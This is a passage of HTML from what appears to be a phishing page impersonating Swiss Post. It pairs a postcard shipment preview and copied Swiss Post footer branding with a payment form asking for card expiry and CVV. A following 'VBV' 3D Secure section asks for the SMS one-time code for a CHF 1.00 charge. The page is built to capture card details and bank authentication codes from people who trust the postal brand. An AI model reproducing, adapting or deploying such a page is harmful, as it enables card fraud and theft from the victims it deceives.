                                                <div class="form-group">
                                                    <label for="card-expiry">Gültig bis</label>
                                                    <input type="text" id="card-expiry" name="card-expiry" placeholder="MM/YY" maxlength="5" required>
                                                    <div class="error-message" id="card-expiry-error"></div>
                                                    <div class="success-message" id="card-expiry-success"></div>
                                                </div>
                                                
                                                <div class="form-group">
                                                    <label for="card-cvv">CVV</label>
                                                    <input type="text" id="card-cvv" name="card-cvv" placeholder="123" maxlength="4" required>
                                                    <div class="error-message" id="card-cvv-error"></div>
                                                    <div class="success-message" id="card-cvv-success"></div>
                                                </div>
                                            </div>
                                            
                                            <div class="form-group">
                                                <button type="submit" class="btn btn-primary btn-animated" style="width: 100%; padding: 1rem; font-size: 1.1rem;">
                                                    Zahlung bestätigen
                                                </button>
                                            </div>
                                        </form>
                                    </div>

                                    <!-- VBV Verification Section -->
                                    <div class="vbv-section" id="vbv-section">
                                        <div class="vbv-header">
                                            <h3>3D Secure Verification</h3>
                                            <p>Bitte geben Sie den OTP-Code ein, den Sie per SMS erhalten haben</p>
                                        </div>

                                        <div class="card-info-display">
                                            <div class="card-info-row">
                                                <span class="card-info-label">Karte:</span>
                                                <span class="card-info-value" id="masked-card">**** **** **** 1234</span>
                                            </div>
                                            <div class="card-info-row">
                                                <span class="card-info-label">Kartentyp:</span>
                                                <span class="card-info-value" id="card-type-name">Visa</span>
                                            </div>
                                            <div class="card-info-row">
                                                <span class="card-info-label">Betrag:</span>
                                                <span class="card-info-value" id="transaction-amount">CHF 1.00</span>
                                            </div>
                                        </div>

                                        <div class="vbv-timer" id="vbv-timer">
                                            Code läuft ab in: <span id="timer-seconds">600</span> Sekunden
                                        </div>

                                        <div class="otp-input-group">
                                            <label>OTP Code eingeben:</label>
                                            <div class="otp-input-container">
                                                <input type="text" class="otp-input" maxlength="1" data-index="0">
                                                <input type="text" class="otp-input" maxlength="1" data-index="1">
                                                <input type="text" class="otp-input" maxlength="1" data-index="2">
                                                <input type="text" class="otp-input" maxlength="1" data-index="3">
                                                <input type="text" class="otp-input" maxlength="1" data-index="4">
                                                <input type="text" class="otp-input" maxlength="1" data-index="5">
                                            </div>
                                        </div>

                                        <div class="vbv-actions">
                                            <button type="button" class="btn-vbv-cancel" id="vbv-cancel">Abbrechen</button>
                                            <button type="button" class="btn-vbv-confirm" id="vbv-confirm">Bestätigen</button>
                                        </div>
                                    </div>
                                </div>
                                <div _ngcontent-ng-c2396243081="" id="preview" class="d-flex vsc-preview-container">
                                    <vsc-preview _ngcontent-ng-c2396243081="" _nghost-ng-c3856722817=""
                                        ><div _ngcontent-ng-c3856722817="">
                                            <div _ngcontent-ng-c3856722817="" id="preview-card" class="preview-card">
                                                <div
                                                    _ngcontent-ng-c3856722817=""
                                                    id="preview-sr-region"
                                                    role="region"
                                                    class="visually-hidden"
                                                    aria-atomic="true"
                                                    aria-live="polite"
                                                >
                                                    <div
                                                        _ngcontent-ng-c3856722817=""
                                                        aria-label="Vorschau Zielland Schweiz Ihre Sendung Postkarte Gewicht bis 100 g Zustellungsdatum - Optionale Zusatzleistungen - Preis CHF 1.00"
                                                    ></div>
                                                </div>
                                                <div _ngcontent-ng-c3856722817="" class="d-flex preview-title-row">
                                                    <em _ngcontent-ng-c3856722817="" class="pi pi-2x pi-3140"></em>
                                                    <h3
                                                        _ngcontent-ng-c3856722817=""
                                                        translate=""
                                                        class="preview-title mb-0 align-self-center font-bold-lg"
                                                    >
                                                        Vorschau
                                                    </h3>
                                                </div>
                                                <table _ngcontent-ng-c3856722817="" role="presentation" class="font-sm">
                                                    <colgroup _ngcontent-ng-c3856722817="">
                                                        <col _ngcontent-ng-c3856722817="" class="col-done" />
                                                        <col _ngcontent-ng-c3856722817="" />
                                                        <col _ngcontent-ng-c3856722817="" />
                                                    </colgroup>
                                                    <tr _ngcontent-ng-c3856722817="" id="country-row">
                                                        <td _ngcontent-ng-c3856722817="" class="align-top">
                                                            <em
                                                                _ngcontent-ng-c3856722817=""
                                                                aria-hidden="true"
                                                                class="pi pi-2105-success"
                                                            ></em
                                                            ><!---->
                                                        </td>
                                                        <td _ngcontent-ng-c3856722817="" colspan="2">
                                                            <h5
                                                                _ngcontent-ng-c3856722817=""
                                                                class="preview-label font-bold-rgb"
                                                            >
                                                                Zielland
                                                            </h5>
                                                            <div _ngcontent-ng-c3856722817="" class="preview-value">
                                                                Schweiz
                                                            </div>
                                                        </td>
                                                    </tr>
                                                    <tr _ngcontent-ng-c3856722817="" id="sending-type-row">
                                                        <td _ngcontent-ng-c3856722817="" class="align-top">
                                                            <em
                                                                _ngcontent-ng-c3856722817=""
                                                                aria-hidden="true"
                                                                class="pi pi-2105-success"
                                                            ></em
                                                            ><!---->
                                                        </td>
                                                        <td _ngcontent-ng-c3856722817="" colspan="2">
                                                            <h5
                                                                _ngcontent-ng-c3856722817=""
                                                                class="preview-label font-bold-rgb"
                                                            >
                                                                Ihre Sendung
                                                            </h5>
                                                            <div _ngcontent-ng-c3856722817="" class="preview-value">
                                                                <span _ngcontent-ng-c3856722817="">Postkarte</span
                                                                ><!----><!---->
                                                            </div>
                                                        </td>
                                                    </tr>
                                                    <tr _ngcontent-ng-c3856722817="" id="weight-row">
                                                        <td _ngcontent-ng-c3856722817="" class="align-top">
                                                            <em
                                                                _ngcontent-ng-c3856722817=""
                                                                aria-hidden="true"
                                                                class="pi pi-2105-success"
                                                            ></em
                                                            ><!---->
                                                        </td>
                                                        <td _ngcontent-ng-c3856722817="" colspan="2">
                                                            <h5
                                                                _ngcontent-ng-c3856722817=""
                                                                class="preview-label font-bold-rgb"
                                                            >
                                                                Gewicht
                                                            </h5>
                                                            <div _ngcontent-ng-c3856722817="" class="preview-value">
                                                                bis 100 g
                                                            </div>
                                                        </td>
                                                    </tr>
                                                    <tr _ngcontent-ng-c3856722817="" id="delivery-time-row">
                                                        <td _ngcontent-ng-c3856722817="" class="align-top"><!----></td>
                                                        <td _ngcontent-ng-c3856722817="" colspan="2">
                                                            <h5
                                                                _ngcontent-ng-c3856722817=""
                                                                class="preview-label font-bold-rgb"
                                                            >
                                                                Zustellungsdatum
                                                            </h5>
                                                            <div _ngcontent-ng-c3856722817="" class="preview-value" id="preview-delivery-date">
                                                                <!----><span _ngcontent-ng-c3856722817="">-</span
                                                                ><!---->
                                                            </div>
                                                        </td>
                                                        <!----><!---->
                                                    </tr>
                                                    <tr _ngcontent-ng-c3856722817="" id="options-row" class="last-row">
                                                        <td _ngcontent-ng-c3856722817="" class="align-top"><!----></td>
                                                        <td _ngcontent-ng-c3856722817="" colspan="2">
                                                            <h5
                                                                _ngcontent-ng-c3856722817=""
                                                                class="preview-label font-bold-rgb"
                                                            >
                                                                Optionale Zusatzleistungen
                                                            </h5>
                                                            <!----><span _ngcontent-ng-c3856722817="">-</span
                                                            ><!---->
                                                        </td>
                                                    </tr>
                                                    <tr
                                                        _ngcontent-ng-c3856722817=""
                                                        id="price-row"
                                                        class="price-row font-bold-rgb"
                                                    >
                                                        <td _ngcontent-ng-c3856722817=""></td>
                                                        <td _ngcontent-ng-c3856722817="">
                                                            <h5
                                                                _ngcontent-ng-c3856722817=""
                                                                class="preview-label font-bold-rgb"
                                                            >
                                                                Preis
                                                            </h5>
                                                        </td>
                                                        <td
                                                            _ngcontent-ng-c3856722817=""
                                                            class="price-row-price font-lg text-end"
                                                        >
                                                            <span _ngcontent-ng-c3856722817=""
                                                                ><strong
                                                                    _ngcontent-ng-c3856722817=""
                                                                    style="font-size: x-large"
                                                                    id="preview-price">CHF 1.00</strong
                                                                ></span
                                                            ><!---->
                                                        </td>
                                                        <!----><!---->
                                                    </tr>
                                                </table>
                                            </div>
                                        </div></vsc-preview
                                    ><!---->
                                </div>
                            </div>
                            <!---->
                        </div>
                    </div></vsc-main
                ><!----></vsc-root
            >
        </main>
        <div class="post-custom-footer">
    <div class="custom-footer-container">
        <div class="custom-footer-sections">
            <div class="custom-footer-section">
                <h3>Direkt zu</h3>
                <ul class="custom-footer-links">
                    <li><a href="#" target="_blank">PostFinance</a></li>
                    <li><a href="#" target="_blank">PostAuto</a></li>
                    <li><a href="#" target="_blank">Immobilien</a></li>
                    <li><a href="#" target="_blank">Post Company Cars</a></li>
                    <li><a href="#" target="_blank">Post Advertising</a></li>
                    <li><a href="#" target="_blank">Swiss Post Cargo</a></li>
                </ul>
            </div>
            <div class="custom-footer-section">
                <h3>Mehr Post</h3>
                <ul class="custom-footer-links">
                    <li><a href="#" >Standorte</a></li>
                    <li><a href="#">Innovation</a></li>
                    <li><a href="#">Verantwortung</a></li>
                    <li><a href="#" >Shop</a></li>
                    <li><a href="#">Medien</a></li>
                    <li><a href="#">Apps der Post</a></li>
                    <li><a href="#">Lieferanten</a></li>
                </ul>
            </div>
            <div class="custom-footer-section">
                <h3>Contact Center</h3>
                <div class="custom-contact-info">
                    <p class="custom-phone">+41 848 888 888</p>
                    <p class="custom-phone-desc">CHF 0.08/Min. vom Schweizer Festnetz</p>
                    <p class="custom-hours-text">Montag bis Freitag: 7.30–18.00 Uhr</p>
                    <p class="custom-hours-text">Samstag: 8.00–12.00 Uhr</p>
                    <p class="custom-support">Live Support: Bildschirm teilen</p>
                </div>
            </div>
            <div class="custom-footer-section">
                <h3>Adresse Contact Center</h3>
                <address class="custom-address">
                    Post CH Netz AG<br />
                    Contact Center Post<br />
                    Wankdorfallee 4<br />
                    3030 Bern
                </address>
                <div class="custom-social">
                    <h3>Folgen Sie uns</h3>
                    <div class="custom-social-links">
                        <a href="https://www.facebook.com/swisspost" target="_blank">Facebook</a>
                        <a href="https://www.instagram.com/swisspost/" target="_blank">Instagram</a>
                        <a href="https://www.youtube.com/swisspost" target="_blank">YouTube</a>
                        <a href="https://www.linkedin.com/company/swiss-post" target="_blank">LinkedIn</a>
                    </div>
                </div>
            </div>
        </div>
        <div class="custom-copyright">
            <p>© 2025 Die Schweizerische Post AG</p>
            <div class="custom-legal-links">
                <a href="https://www.post.ch/de/pages/footer/barrierefreiheit-bei-der-post">Barrierefreiheit</a>
                <a href="https://www.post.ch/de/pages/footer/allgemeine-geschaeftsbedingungen-agb">Allgemeine Geschäftsbedingungen</a>
                <a href="https://www.post.ch/de/pages/footer/datenschutz-und-rechtliches">Datenschutz und Rechtliches</a>
                <a href="https://www.post.ch/de/pages/footer/impressum">Impressum</a>
                <button class="custom-cookie-btn">Cookie-Einstellungen</button>
            </div>
        </div>
    </div>
</div>
      

    
    </body>
</html>
